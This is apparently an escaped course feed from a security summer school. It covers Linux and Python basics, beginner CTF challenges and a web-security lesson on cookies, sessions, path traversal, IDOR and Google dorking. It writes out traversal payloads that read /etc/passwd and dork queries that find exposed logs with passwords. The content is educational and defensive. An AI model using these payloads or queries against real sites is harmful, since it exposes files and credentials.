&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">my_bytes&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">b&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;SSS Rulz, but in bytes!&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>As always, the demo &lt;code>activities/demo-python/strings_bytes.py&lt;/code> provides a more in-depth presentation of byte array and string operations.
Go take a look.&lt;/p>
&lt;h2 id="summary">Summary&lt;/h2>
&lt;h3 id="linux">Linux&lt;/h3>
&lt;p>A quick rundown of the most important Linux commands from today&amp;rsquo;s session is:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>ls&lt;/code>: list the current directory;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>cd &amp;lt;direcory&amp;gt;&lt;/code>: move to the specified directory;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>mkdir&lt;/code> creates a new directory;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>touch&lt;/code> creates a new file;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>rm&lt;/code> deletes files and directories;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>whoami&lt;/code>: prints the current user;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>pwd&lt;/code>: prints the absolute path to the current directory;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>cat&lt;/code>: output the contents of a file;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>Tab&lt;/code>: your best friend in the whole world;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>man &amp;lt;command&amp;gt;&lt;/code>: the source of infinite wisdom.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="python">Python&lt;/h3>
&lt;p>Some concepts to remember about Python are:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>There is no need for a &lt;code>main&lt;/code> function or for types;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Indentation is everything&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Basic arithmetic is almost the same as in C/C++;&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>if&lt;/code>s, &lt;code>for&lt;/code>s, &lt;code>while&lt;/code>s and function declarations all end in a colon (&lt;code>:&lt;/code>);&lt;/p>
&lt;/li>
&lt;li>
&lt;p>There&amp;rsquo;s a difference between bytes and strings and they are &lt;strong>not&lt;/strong> interchangeable.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="activities">Activities&lt;/h2>
&lt;p>Security Summer School most activities take the shape of &lt;strong>CTF challenges&lt;/strong>.
CTF stands for &amp;ldquo;Capture The Flag&amp;rdquo; and is a type of challenge where you are given access to an environment (a set of files, a site, a remote system etc.), which you have to use in order to obtain and submit a special string called &lt;strong>flag&lt;/strong>.
Now complete the challenges for today&amp;rsquo;s session.
All flags follow this pattern:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>SSS{some_random_ASCII_characters}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="tutorial-in-your-face">Tutorial: In Your Face&lt;/h3>
&lt;p>The flag is literally in your face.&lt;/p>
&lt;p>Connect to the specified virtual machine and use &lt;code>ls&lt;/code> to explore your surroundings:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-console" data-lang="console">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">ctf@tutorial:~$ ls
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000;font-style:italic">flag
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now just use &lt;code>cat&lt;/code> to extract the content of the &lt;code>flag&lt;/code> file.&lt;/p>
&lt;h3 id="challenge-did-you-look-everywhere">Challenge: Did You Look Everywhere?&lt;/h3>
&lt;p>We assure you the flag is somewhere in the &lt;code>/home/ctf&lt;/code> directory.&lt;/p>
&lt;h3 id="challenge-whats-running">Challenge: What&amp;rsquo;s Running?&lt;/h3>
&lt;p>Did you know flags can &lt;strong>run&lt;/strong>?&lt;/p>
&lt;h3 id="challenge-quick-mafs">Challenge: Quick Mafs&lt;/h3>
&lt;p>The flag&amp;rsquo;s format is the classic &lt;code>SSS{...}&lt;/code>, where &lt;code>...&lt;/code> represent a string obtained by concatenating the &lt;strong>first 10 numbers&lt;/strong> oobtained by performing the computations below.&lt;/p>
&lt;p>Let each number be &lt;code>n[i]&lt;/code>, where &lt;code>i&lt;/code> is its index.
&lt;code>n[0] = 1337&lt;/code>.
This is your first number.
The next numbers are defined by the formula below, where &lt;code>^&lt;/code> signifies exponentiation.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>n[i] = (n[i - 1]^3 * 67 + 31) % 2000, for all i &amp;gt; 0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>And, please, don&amp;rsquo;t compute the numbers manually.
You&amp;rsquo;ve just learned a cool new programming language that you can use!&lt;/p>
&lt;h3 id="challenge-jumbled">Challenge: Jumbled&lt;/h3>
&lt;p>The flag you&amp;rsquo;re given in &lt;code>activities/jumbled/public/flag&lt;/code> does contain the actual flag, but not quite.
Use your Python skills to reconstruct it.
You&amp;rsquo;ll also need some trial and error here.&lt;/p>
&lt;h2 id="further-reading">Further Reading&lt;/h2>
&lt;h3 id="more-terminal-tricks">More Terminal Tricks&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Use &lt;code>↑&lt;/code> and &lt;code>↓&lt;/code> to navigate between your previous commands.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Use &lt;code>Ctrl + r&lt;/code> to search for a previously issued command.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Use &lt;code>Ctrl + A&lt;/code> to navigate to the beginning of the line.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Use &lt;code>Ctrl + E&lt;/code> to navigate to the end of the line.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Use &lt;code>Alt + B&lt;/code> to navigate one word to the left of the cursor.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Use &lt;code>Alt + F&lt;/code> to navigate one word to the right of the cursor.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Use &lt;code>Alt + Backspace&lt;/code> to delete one word to the left of the cursor.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Use &lt;code>Ctrl + Delete&lt;/code> to delete one word to the right of the cursor.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Use &lt;code>Ctrl + D&lt;/code> to close the current terminal.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="altering-the-prompt">Altering the Prompt&lt;/h3>
&lt;p>You can modify your prompt while keeping the same user and hostname, by using the &lt;code>PS1&lt;/code> &lt;strong>environment variable&lt;/strong>.
Check out how you can do this &lt;a href="https://www.redhat.com/sysadmin/command-prompt-tell-me">here&lt;/a>.&lt;/p>
&lt;h3 id="alternatives-to-bash">Alternatives to Bash&lt;/h3>
&lt;p>There are quite a few alternatives to Bash, such as &lt;a href="https://ohmyz.sh/">zsh&lt;/a> and &lt;a href="http://manpages.ubuntu.com/manpages/trusty/man1/dash.1.html">DASH&lt;/a>.
Feel free to experiment with them in your free time.&lt;/p>
&lt;h3 id="hardcore-python">Hardcore Python&lt;/h3>
&lt;p>Python is well-known for being able to produce short code.
A part of this feature owes to its &lt;a href="https://www.datacamp.com/community/tutorials/python-list-comprehension?utm_source=adwords_ppc&amp;amp;utm_campaignid=1455363063&amp;amp;utm_adgroupid=65083631748&amp;amp;utm_device=c&amp;amp;utm_keyword=&amp;amp;utm_matchtype=b&amp;amp;utm_network=g&amp;amp;utm_adpostion=&amp;amp;utm_creative=278443377095&amp;amp;utm_targetid=aud-392016246653:dsa-486527602543&amp;amp;utm_loc_interest_ms=&amp;amp;utm_loc_physical_ms=1011795&amp;amp;gclid=CjwKCAjw64eJBhAGEiwABr9o2NXKuiirYa09rYT-hLIh7th5Exg3vj9YPnpAT7EszhE539X_9guv1RoCvhIQAvD_BwE">list comprehensions&lt;/a> and its &lt;a href="https://www.geeksforgeeks.org/python-string-join-method/">&lt;code>join&lt;/code> function&lt;/a>.&lt;/p>
&lt;p>If you want to learn even more, take a look at Python&amp;rsquo;s &lt;a href="https://docs.python.org/3/howto/functional.html#built-in-functions">built-in list operations&lt;/a>:
Learning about &lt;a href="https://towardsdatascience.com/lambda-functions-with-practical-examples-in-python-45934f3653a8">lambda functions&lt;/a> will surely ease your use of the above functions.&lt;/p></description></item><item><title>Web:</title><link>/web/cookies-session-management-access-control/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/web/cookies-session-management-access-control/</guid><description>
&lt;h1 id="introduction">Introduction&lt;/h1>
&lt;p>In order to understand how to protect a web application, you need to understand how an attacker thinks.
And in order to do that, you need to understand how a platform is built and what techniques are used to ensure minimum usability.
As a first step, you can analyze web applications using readily available tools, such as the browser’s built-in Developer Tools.
Further on, you can attempt to find more information about the basic mechanisms that enable the server to identify its clients and keep tabs on who they are (authentication) and what they are allowed to do (authorization), through the use of cookies and sessions.&lt;/p>
&lt;h1 id="stateful-http-cookies">Stateful HTTP: Cookies&lt;/h1>
&lt;p>As we mentioned in the previous session, HTTP is a stateless protocol used to communicate over the internet.
This means that a request is not aware of any of the previous ones, and each request is executed independently.
Given its stateless nature, simple mechanisms such as HTTP cookies were created to overcome the issue.&lt;/p>
&lt;p>An HTTP cookie (also called web cookie, Internet cookie, browser cookie, or simply cookie) is a small piece of data sent from a website and stored on the user&amp;rsquo;s computer by the user&amp;rsquo;s web browser while the user is browsing.
Cookies were designed to be a reliable mechanism for websites to remember stateful information (such as items added in the shopping cart in an online store) or to record the user&amp;rsquo;s browsing activity (including clicking particular buttons, logging in, or recording which pages were visited in the past).
They can also be used to remember pieces of information that the user previously entered into form fields, such as names, addresses, passwords, and credit card numbers.&lt;/p>
&lt;p>&lt;img src="./assets/cookies.png" alt="Cookies">&lt;/p>
&lt;h2 id="what-is-a-cookie">What is a cookie?&lt;/h2>
&lt;p>A cookie is a &lt;em>key=value&lt;/em> pair stored in a text file on the user’s computer.
This file can be found, for example, at the following path on a Windows 10 using Chrome:&lt;/p>
&lt;p>&lt;code>C:\Users\Your User Name\AppData\Local\Google\Chrome\User Data\Default\Cookies&lt;/code>&lt;/p>
&lt;p>An example of cookies set for a website could be:&lt;/p>
&lt;ul>
&lt;li>username=admin&lt;/li>
&lt;li>cookie_consent=1&lt;/li>
&lt;li>theme=dark&lt;/li>
&lt;/ul>
&lt;p>The first cookie stores the username, so it can be displayed to the user without querying the database.
The second one stores the choice made by the user regarding the cookie consent, so the application would not continue to show the message every time.
Finally, the third one stores which theme was selected (in this case, a dark theme).&lt;/p>
&lt;p>Once a cookie has been set, the browser will send the cookie information in all subsequent HTTP requests until the cookie is deleted.
Additionally, the cookie can have zero or more attributes, such as:&lt;/p>
&lt;ul>
&lt;li>&lt;em>Domain&lt;/em> and &lt;em>Path&lt;/em> attributes define the scope of the cookies.
These attributes tell the browser what website they belong to.&lt;/li>
&lt;li>&lt;em>Same origin policy&lt;/em> dictates that websites are only allowed to set cookies on their own domain.
In other words, the &lt;code>www.example.com&lt;/code> website is not allowed to set cookies on &lt;code>www.test.com&lt;/code> and vice versa.
A website is only able to control cookies that are within its own domain.&lt;/li>
&lt;li>The &lt;em>Expires&lt;/em> attribute defines when the cookie is deleted.
Alternatively, the Max-Age attribute can be used to state the number of seconds after the cookie is to be deleted.&lt;/li>
&lt;li>The &lt;em>Secure&lt;/em> attribute defines that cookies should only be sent using secure channels such as HTTPS.
Cookies with the Secure attribute should only be sent through a secure connection.
This protects the application&amp;rsquo;s cookies against theft attempts.&lt;/li>
&lt;li>The &lt;em>http-only&lt;/em> attribute defines that cookie should be exposed only using HTTP or HTTPS channels.
This means that the cookies with this attribute cannot be accessed via client-side scripting or other methods.
This is a defense mechanism against &lt;a href="https://owasp.org/www-community/HttpOnly">some attacks&lt;/a>.&lt;/li>
&lt;/ul>
&lt;h1 id="stateful-http-sessions">Stateful HTTP: Sessions&lt;/h1>
&lt;p>As previously stated, HTTP is stateless.
Therefore, it needs a mechanism to remember information from previous requests and associate it with a user for authentication purposes.
The cookies are one way to achieve this.
However, they are considered highly insecure because the user can easily manipulate their content.
We cannot directly use them for authentication and other sensitive data.
The solution to this problem is the session, which stores the data on the server, rather than the client.
The session ID can be used as a means of communication.&lt;/p>
&lt;h2 id="how-does-a-session-work">How does a session work?&lt;/h2>
&lt;p>When accessing a website that uses sessions, each user is assigned a session ID.
They are more secure than the previously mentioned method mainly because the data never leaves the server, so an attacker cannot alter it.
Instead, the ID is used to uniquely identify each user and associate the respective information with them.&lt;/p>
&lt;p>Sessions are usually short-lived, which makes them ideal for storing temporary states between pages.
Sessions also expire once the user closes his browser or after a predefined amount of time (for example, 30 minutes).&lt;/p>
&lt;p>The basic workflow is:&lt;/p>
&lt;ol>
&lt;li>The server starts a new session (sets a cookie via the HTTP Cookie header).&lt;/li>
&lt;li>The server sets a new session variable (stored on the server-side).&lt;/li>
&lt;li>When the client changes the page, it sends all the cookies in the request, along with the session ID from step 1.&lt;/li>
&lt;li>The server reads the session ID from the cookie.&lt;/li>
&lt;li>The server matches the session ID with the entries of a local list (in-memory, text file etc.).&lt;/li>
&lt;li>If the server finds a match, it reads the stored variables. For PHP, these variables will become available in the superglobal variable &lt;code>$_SESSION&lt;/code>.&lt;/li>
&lt;li>If the server doesn’t find a match, it will create a new session and repeat steps 1-6.&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="./assets/session.jpg" alt="Session lifecycle">&lt;/p>
&lt;p>Example of a session in PHP:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ce5c00;font-weight:bold">&amp;lt;?&lt;/span>&lt;span style="color:#000">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">session_start&lt;/span>&lt;span style="color:#000;font-weight:bold">();&lt;/span> &lt;span style="color:#8f5902;font-style:italic">// Start the session
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>&lt;span style="color:#000">$_SESSION&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;John Doe&amp;#34;&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">$_SESSION&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;is_admin&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">]&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#204a87;font-weight:bold">true&lt;/span>&lt;span style="color:#000;font-weight:bold">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">echo&lt;/span> &lt;span style="color:#4e9a06">&amp;#34;Hello &amp;#34;&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span> &lt;span style="color:#000">$_SESSION&lt;/span>&lt;span style="color:#000;font-weight:bold">[&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">?&amp;gt;&lt;/span>&lt;span style="color:#a40000">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Example of a session in Python:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">s&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">requests&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">Session&lt;/span>&lt;span style="color:#000;font-weight:bold">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">s&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">get&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;https://httpbin.org/cookies/set/sessioncookie/123456789&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">r&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#000">s&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">get&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#4e9a06">&amp;#39;https://httpbin.org/cookies&amp;#39;&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87">print&lt;/span>&lt;span style="color:#000;font-weight:bold">(&lt;/span>&lt;span style="color:#000">r&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#000">text&lt;/span>&lt;span style="color:#000;font-weight:bold">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic"># &amp;#39;{&amp;#34;cookies&amp;#34;: {&amp;#34;sessioncookie&amp;#34;: &amp;#34;123456789&amp;#34;}}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>One might consider that sessions are pretty secure.
However, they won’t stop an attacker to intercept the cookie with the session ID, for example using a &lt;a href="https://www.imperva.com/learn/application-security/man-in-the-middle-attack-mitm/">Man-in-the-Middle attack&lt;/a> over an insecure Wi-Fi connection, and steal the session ID to use it.
This won’t give them access to the values that are stored on the server, but they will be able to impersonate the user or perform actions on their behalf.
This is known as session hijacking.
You can read more on this subject &lt;a href="https://owasp.org/www-community/attacks/Session_hijacking_attack">here&lt;/a> and &lt;a href="https://www.netsparker.com/blog/web-security/session-hijacking/">here&lt;/a>.&lt;/p>
&lt;h1 id="authentication-vs-authorization">Authentication vs Authorization&lt;/h1>
&lt;p>Two concepts that usually make people confused are authentication and authorization.
Both terms are often used in conjunction with each other when it comes to security and gaining access to the system.
They are essential in almost every modern web application, as most of these apps need a way to uniquely identify their users using an account.
These accounts can contain both personal information, available only to the logged in user, and public information, available to anybody.
Based on the privilege level, users can have access to various functionalities, such as deleting other users, creating blog posts etc.&lt;/p>
&lt;p>Fundamentally, authentication refers to &lt;strong>who you are&lt;/strong> while authorization refers to &lt;strong>what you can do&lt;/strong>.&lt;/p>
&lt;p>&lt;strong>Authentication&lt;/strong> is the process of verifying the identity of a person or device.
A common example is entering a username and password when you log in to a website.
Entering the correct login information lets the website know who you are and that it is actually you accessing the website.&lt;/p>
&lt;p>There could be other methods of authentication, such as passcodes, biometrics (fingerprints), Two-Factor Authentication, etc.
We won’t insist too much on these other methods, but it’s good to know they exist.&lt;/p>
&lt;p>&lt;strong>Authorization&lt;/strong> is a security mechanism to determine access levels or user/client privileges related to system resources including files, services, computer programs, data and application features.
This is the process of granting or denying access to a network resource that allows the user access to various resources based on the user&amp;rsquo;s identity.&lt;/p>
&lt;h2 id="real-life-scenarios">Real-life scenarios&lt;/h2>
&lt;p>Now imagine what would happen if someone obtains access to your Facebook account.
Besides the previously public information, such as your name and your birthday, they can now view your friend lists, private conversations, or even impersonate you through a post.
Although this situation won’t affect Facebook directly, it will certainly affect you.&lt;/p>
&lt;p>What if someone were to gain access to an administrator account of a university?
They could remove all the students, erase their grades and all the study materials.
This would be a really nefarious incident that would destroy the institution’s reputation and will also affect you as a student.&lt;/p>
&lt;p>This is why authentication and authorization are very important and their security is crucial.&lt;/p>
&lt;h1 id="path-traversal">Path Traversal&lt;/h1>
&lt;p>In many web applications, resources are accessed using a filename as a parameter.
This file is processed and displayed to the client by the application.
If the application does not verify the parameter, the attacker might be able to exploit the application and display an arbitrary file from the target system.
Normally an attacker would try to access password or configuration files to gain access to the system.
Obviously, server-side script files could be accessed to perform manual inspection for vulnerabilities.
Consider the following URL:&lt;/p>
&lt;p>&lt;code>http://example.com/view.php?file=image.jpg&lt;/code>&lt;/p>
&lt;p>If the attacker wants to investigate the view.php file for possible exploitable coding mistakes, he would try to use the script in order to open the file:&lt;/p>
&lt;p>&lt;code>http://example.com/view.php?file=view.php &lt;/code>&lt;/p>
&lt;p>It is likely that images are stored in a subdirectory, so the attacker might have to access the parent directory:&lt;/p>
&lt;p>&lt;code>http://example.com/view.php?file=../view.php&lt;/code> or &lt;code>http://example.com/view.php?file=../../view.php&lt;/code>&lt;/p>
&lt;p>Depending on the system, a backslash could also be used:&lt;/p>
&lt;p>&lt;code>http://example.com/view.php?file=..\..\view.php &lt;/code>&lt;/p>
&lt;p>An example of accessing system files:&lt;/p>
&lt;p>&lt;code>http://example.com/view.php?file=../../../../etc/passwd&lt;/code>&lt;/p>
&lt;p>&lt;img src="./assets/path_traversal.png" alt="Path Traversal">&lt;/p>
&lt;h2 id="path-traversal-prevention">Path Traversal Prevention&lt;/h2>
&lt;p>The application should not allow directory traversal or the accessing of arbitrary files.
If the files to be accessed are known, the application should implement a mapping between the file and application-specific identifier.
This identifier can be hardcoded in the application to prevent any malicious attempts to modify it.&lt;/p>
&lt;p>If it is considered unavoidable to pass user-supplied input to filesystem APIs, then two layers of defense should be used together to prevent attacks:&lt;/p>
&lt;ul>
&lt;li>The application should validate the user input before processing it.
Ideally, the validation should compare against a whitelist of permitted values.
If that isn&amp;rsquo;t possible for the required functionality, then the validation should verify that the input contains only permitted content, such as purely alphanumeric characters.&lt;/li>
&lt;li>After validating the supplied input, the application should append the input to the base directory and use a platform filesystem API to canonicalize the path.
It should verify that the canonicalized path starts with the expected base directory.&lt;/li>
&lt;/ul>
&lt;p>Below is an example of some simple Java code to validate the canonical path of a file based on user input:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#000">File&lt;/span> &lt;span style="color:#000">file&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">=&lt;/span> &lt;span style="color:#204a87;font-weight:bold">new&lt;/span> &lt;span style="color:#000">File&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">(&lt;/span>&lt;span style="color:#000">BASE_DIRECTORY&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">,&lt;/span> &lt;span style="color:#000">userInput&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">);&lt;/span>&lt;span style="color:#a40000">`&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#204a87;font-weight:bold">if&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">(&lt;/span>&lt;span style="color:#000">file&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">.&lt;/span>&lt;span style="color:#c4a000">getCanonicalPath&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">().&lt;/span>&lt;span style="color:#c4a000">startsWith&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">(&lt;/span>&lt;span style="color:#000">BASE_DIRECTORY&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">))&lt;/span> &lt;span style="color:#ce5c00;font-weight:bold">{&lt;/span>&lt;span style="color:#a40000">`&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">// process file
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8f5902;font-style:italic">&lt;/span>&lt;span style="color:#ce5c00;font-weight:bold">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="insecure-direct-object-references">Insecure Direct Object References&lt;/h1>
&lt;p>Insecure direct object reference vulnerability is similar to path traversal vulnerability.
The application allows access to resources using an identifier that is controllable by the user.
In this case, however, the identifier is not a file / path as is the case with path traversal.&lt;/p>
&lt;p>Consider the following case where a user is able to view his own invoice:&lt;/p>
&lt;p>&lt;code>http://www.example.com/view.php?invoice=24411&lt;/code>&lt;/p>
&lt;p>Now, by changing the invoice number the user might be able to access other invoices, including ones that are not his own, thereby gaining access to the sensitive information of other users.
Obviously the application should enforce access control over the items to be accessed.
If the application fails to do so, this would be a case of insecure direct object reference vulnerability.&lt;/p>
&lt;p>When performing penetration tests, the application parameters should certainly be investigated by iterating through possible values and observing the responses.&lt;/p>
&lt;p>&lt;img src="./assets/insecure_direct_object_references.png" alt="Insecure Direct Object References">&lt;/p>
&lt;h2 id="insecure-direct-object-references-prevention">Insecure Direct Object References Prevention&lt;/h2>
&lt;p>First, you should control all normal, ajax and API requests when creating an application.
For example, can a read-only user write anything in the app?
Or can a non-admin user access and create API tokens that should only be created by an admin user?
So, in order to test all the possible IDOR vulnerabilities, you should think like a hacker.&lt;/p>
&lt;p>You can provide permissions on your application for all endpoints.
If your &lt;code>privatesection&lt;/code> endpoint includes the API requests such as &lt;code>/api/privatesection/admins&lt;/code>, &lt;code>/api/privatesection/console&lt;/code>, &lt;code>/api/privatesection/tokens&lt;/code>, you can block the endpoint for non-admin users.&lt;/p>
&lt;p>Moreover, to make the attacker’s job harder or prevent it altogether, you can use hash functions and hashed values instead of regular numbers and strings.&lt;/p>
&lt;h2 id="robotstxt-preventing-caching">robots.txt: Preventing Caching&lt;/h2>
&lt;p>The &lt;strong>robots.txt&lt;/strong> file provides a list of instructions for automated Web crawlers, also called robots or bots.
Standardized at &lt;a href="http://www.robotstxt.org/robotstxt.html">robotstxt&lt;/a>, this file allows you to define, with a great deal of precision, which files and directories are off-limits to Web robots.
The robots.txt file must be placed in the root of the Web server with permissions that allow the Web server to read the file.
Lines in the file beginning with a # sign are considered comments and are ignored.
Each line not beginning with a &lt;code>#&lt;/code> should begin with either a User-agent or a disallow statement, followed by a colon and an optional space.
These lines are written to disallow certain crawlers from accessing certain directories or files.&lt;/p>
&lt;p>Each Web crawler should send a user-agent field, which lists the name or type of the crawler.
The value of Google’s user-agent field is &lt;code>Googlebot&lt;/code>.
To address a disallow to Google, the user-agent line should read:&lt;/p>
&lt;p>&lt;code>User-agent: Googlebot&lt;/code>&lt;/p>
&lt;p>According to the original specification, the wildcard character &lt;code>*&lt;/code> can be used in the user-agent field to indicate all crawlers.
The disallow line describes what, exactly; the crawler should not look at.&lt;/p>
&lt;p>&lt;strong>NOTE:&lt;/strong> Hackers don’t have to obey your robots.txt file.
In fact, Web crawlers really don’t have to either, although most of the big-name Web crawlers will, if only for the “CYA” factor.
One fairly common hacker trick is to view a site’s robots.txt file first to get an idea of how files and directories are mapped on the server.
In fact a quick Google query can reveal lots of sites that have had their robots.txt files crawled.
This, of course, is a misconfiguration, because the robots.txt file is meant to stay behind the scenes.&lt;/p>
&lt;h2 id="sitemapxml">Sitemap.xml&lt;/h2>
&lt;p>The sitemap.xml is a simple XML page which could be available on some websites and provide a “roadmap” for Google to the important pages that need to be crawled.
It’s a SEO (Search Engine Optimization) tool to help with the visibility of your website on the internet, but it could also be useful for a hacker, serving basically the same purpose: to give him a roadmap to every page.&lt;/p>
&lt;h2 id="examples-of-google-dorking">Examples of Google Dorking&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>Google Hacking tool from &lt;a href="https://pentest-tools.com/information-gathering/google-hacking">Pentest-Tools&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Passive Google Dork &lt;a href="https://github.com/opsdisk/pagodo">Pagodo&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="explore-log-files-for-login-credentials">Explore LOG Files For Login Credentials&lt;/h3>
&lt;p>&lt;code>allintext:password filetype:log after:2019&lt;/code> - Finds exposed log files that might contain passwords.&lt;/p>
&lt;p>&lt;code>allintext:username filetype:log&lt;/code> - Finds logs that contain usernames.&lt;/p>
&lt;p>&lt;strong>Prevention:&lt;/strong> Do not allow Google to access important data of your website, by properly configuring robots.txt.&lt;/p>
